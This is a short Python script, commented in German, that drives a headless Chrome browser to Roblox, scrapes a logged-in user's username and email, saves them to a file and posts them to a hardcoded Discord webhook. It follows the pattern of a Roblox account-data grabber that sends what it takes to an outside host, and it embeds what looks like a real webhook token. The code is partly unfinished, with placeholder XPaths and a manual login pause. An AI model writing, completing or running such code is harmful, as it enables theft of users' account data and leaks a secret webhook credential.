from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import requests
import time

# Ersetze dies durch deinen Discord-WebHook-URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Pfad zum WebDriver
driver_path = '/path/to/chromedriver'  # Ersetze dies durch den tatsächlichen Pfad

# Chrome-Optionen konfigurieren
chrome_options = Options()
chrome_options.add_argument("--headless")  # Führe Chrome im Hintergrund aus

# Erstelle einen Service für den WebDriver
service = Service(driver_path)

# Initialisiere den WebDriver
driver = webdriver.Chrome(service=service, options=chrome_options)

# Öffne Roblox-Website
driver.get('https://www.roblox.com')

# Hier solltest du den Login-Prozess automatisieren oder dich manuell anmelden
# Warte auf manuelle Eingabe, falls erforderlich
time.sleep(60)  # Zeit, um manuell einzuloggen (ersetze dies durch eine bessere Methode)

# Extrahiere Benutzerdaten (Beispiel)
username = driver.find_element_by_xpath("//element_xpath").text  # Ersetze dies durch den richtigen XPath
email = driver.find_element_by_xpath("//element_xpath").text     # Ersetze dies durch den richtigen XPath

# Speichere die Daten in einer Datei
with open('user_data.txt', 'w') as file:
    file.write(f"Username: {username}\n")
    file.write(f"Email: {email}\n")

# Schließe den Browser
driver.quit()

# Lies die Daten aus der Datei
with open('user_data.txt', 'r') as file:
    log_data = file.read()

# Bereite die Nachricht für den WebHook vor
payload = {
    'content': f'Benutzerdaten:\n{log_data}'
}

# Sende die Nachricht an Discord
requests.post(WEBHOOK_URL, json=payload)
